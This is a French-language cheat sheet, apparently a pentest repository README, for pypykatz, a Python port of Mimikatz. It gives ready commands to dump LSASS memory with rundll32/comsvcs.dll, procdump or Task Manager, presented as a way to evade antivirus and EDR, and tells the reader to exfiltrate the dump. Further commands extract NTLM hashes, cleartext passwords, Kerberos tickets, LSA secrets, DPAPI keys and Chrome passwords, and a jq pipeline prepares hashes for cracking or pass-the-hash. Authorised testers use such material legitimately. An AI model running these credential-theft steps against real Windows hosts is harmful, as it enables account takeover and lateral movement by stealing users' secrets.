<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Aide-mémoire pypykatz

[pypykatz](https://github.com/skelsec/pypykatz) est une implémentation Python pure de [Mimikatz](https://github.com/gentilkiwi/mimikatz). Il permet aux testeurs d'intrusion et aux intervenants d'analyser les vidages de mémoire Windows LSASS, les ruches de registre SAM/SYSTEM/SECURITY, les clés DPAPI et les tickets Kerberos complètement hors ligne sous Linux et macOS sans déclencher Windows Defender, les agents de détection et de réponse des points de terminaison (EDR) ou avoir besoin d'un accès hôte Windows en direct.

---

## Table des matières

-[Vue d'ensemble et sécurité opérationnelle (OpSec)](#overview--operational-security-opsec)
- [Installation](#installation)
-[Analyse de vidage LSASS hors ligne (`lsa minidump`)](#offline-lsass-dump-parsing-lsa-minidump)
- [Extraction de ruche SAM et SYSTEM (`registry sam`)](#sam--system-hive-extraction-registry-sam)
- [Extraction de secrets LSA (`registry security`)](#lsa-secrets-extraction-registry-security)
- [Clés principales DPAPI et analyse des informations d'identification](#dpapi-master-keys--credential-parsing)
- [Exportation JSON et pipelines d'informations d'identification automatisés](#json-export--automated-credential-pipelines)
- [Techniques pour vider LSASS en toute sécurité sous Windows](#techniques-pour-vider-lsass-en-sécurité-sur-windows)

---

## Présentation et sécurité opérationnelle (OpSec)

L’exécution du standard `mimikatz.exe` sur une machine Windows cible déclenche fréquemment les capteurs comportementaux et les signatures statiques. `pypykatz` sépare la phase de dumping de la phase d'analyse :
1. Videz la mémoire du processus LSASS à l'aide des outils natifs ou LOLBAS (Task Manager, `procdump`, `rundll32.exe` ou `comsvcs.dll`).
2. Exfiltrez le fichier `.dmp` vers votre système d'analyse Linux.
3. Analysez les informations d'identification complètement hors ligne avec `pypykatz` sans risque AV.

---

##Installation
```bash
# Recommended: Install via pipx
pipx install pypykatz

# Or via standard pip
python3 -m pip install --user pypykatz

# From source
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .

# Verify installation
pypykatz -h
```
---

## Analyse de vidage LSASS hors ligne (`lsa minidump`)

Analysez les vidages de mémoire générés à partir de `lsass.exe` pour récupérer les mots de passe en texte clair, les hachages NTLM, les hachages SHA1, les tickets Kerberos (TGT/TGS) et les clés de chiffrement AES :

### 1. Analyse de base de Minidump
```bash
pypykatz lsa minidump /path/to/lsass.dmp
```
Le résultat extrait les informations d'identification partitionnées par les fournisseurs de sécurité :
- **msv1_0 :** Noms d'utilisateur, domaines, hachages NTLM et hachages LM.
- **wdigest :** Mots de passe en texte clair (si la mise en cache WDigest est activée).
- **kerberos :** sessions de tickets Kerberos et clés AES.
- **ssp :** Informations d'identification du fournisseur de support de sécurité.
- **livessp :** Identifiants du compte Microsoft.
- **cloudap :** Jetons d'actualisation primaires Azure AD (PRT) et clés de session.

### 2. Analyser plusieurs vidages de mémoire de manière récursive
```bash
pypykatz lsa minidump /loot/dumps/ -r
```
---

## Extraction de ruche SAM & SYSTEM (`registry sam`)

Extrayez les noms d'utilisateur de comptes locaux, les RID et les hachages de mots de passe NTLM à partir de copies de ruche de registre Windows hors ligne :
```bash
pypykatz registry sam /loot/SYSTEM /loot/SAM
```
Sortir:
```text
RID: 500
Username: Administrator
LM: None
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
```
---

## Extraction de secrets LSA (`registry security`)

Récupérez les secrets LSA, les mots de passe des comptes d'ordinateur, les mots de passe de domaine par défaut et les clés en texte clair du compte de service à partir des ruches `SECURITY` et `SYSTEM` :
```bash
pypykatz registry security /loot/SYSTEM /loot/SECURITY
```
Les secrets extraits incluent :
- `_SC_DefaultPassword` : identifiants de connexion automatique.
- `$MACHINE.ACC` : hachages NTLM du compte d'ordinateur de domaine.
- Identifiants de domaine mis en cache (DCC2 / mscache2).

---

## Clés principales DPAPI et analyse des informations d'identification

L'API de protection des données (DPAPI) chiffre les mots de passe Chrome, les clés Wi-Fi et les informations d'identification RDP :

### 1. Extrayez les clés principales DPAPI du registre et du système
```bash
pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_file
```
### 2. Décrypter les mots de passe stockés dans Chrome
```bash
pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
```
---

## Exportation JSON et pipelines d'informations d'identification automatisés

Exportez les informations d'identification analysées directement vers JSON pour une ingestion immédiate dans Hashcat, BloodHound ou CrackMapExec :
```bash
# Export minidump parsing to structured JSON
pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
```
Extrayez des hachages NTLM propres à l'aide de `jq` pour un craquage immédiat du hachage ou une transmission du hachage :
```bash
jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashes.txt
```
---

## Techniques pour vider LSASS en toute sécurité sous Windows

Pour alimenter en mémoire `pypykatz`, créez un minidump LSASS sur l'hôte cible à l'aide de composants natifs :

### 1. LOLBAS natif via `comsvcs.dll` (Admin PowerShell)
```powershell
# Get LSASS process ID
$pid = (Get-Process lsass).Id

# Execute dump using native rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
```
### 2. Interface graphique du gestionnaire de tâches
1. Ouvrez le Gestionnaire des tâches en tant qu'administrateur.
2. Sous **Détails**, cliquez avec le bouton droit sur `lsass.exe`.
3. Cliquez sur **Créer un fichier de vidage** (enregistré dans `%TEMP%\lsass.DMP`).

### 3. Sysinternals `procdump`
```cmd
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```
*Une fois téléchargé sur votre machine Linux, exécutez `pypykatz lsa minidump lsass.dmp`.*